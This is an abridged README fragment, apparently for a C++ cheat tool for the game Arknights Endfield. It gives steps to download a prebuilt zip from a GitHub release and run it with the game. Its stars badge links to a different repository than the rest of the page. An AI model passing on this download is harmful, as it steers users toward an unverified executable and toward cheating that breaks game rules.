...
[![GitHub Stars](https://img.shields.io/github/stars/sglkc/endfield-auto-daily?style=for-the-badge&logo=github)](https://github.com/SpeedStaffHonor/Endfield-Hack/stargazers)
...
![Arknights Endfield Cheat Preview Hack](https://github.com/SpeedStaffHonor/Endfield-Hack/blob/main/assets/image.jpg)
...
## How to use it
1. Download the [latest release build](https://github.com/SpeedStaffHonor/Endfield-Hack/releases/download/v1.4/Endfield.GUI-v1.4.zip) from repo's Releases page.
2. Extract the contents to any folder (e.g., `C:\Endfieldgh` or Desktop).
3. Launch game.
...
[![Made with C++](https://img.shields.io/badge/Made%20with-C++-f34b7d?style=for-the-badge&logo=c%2B%2B)](https://github.com/SpeedStaffHonor/Endfield-Hack)
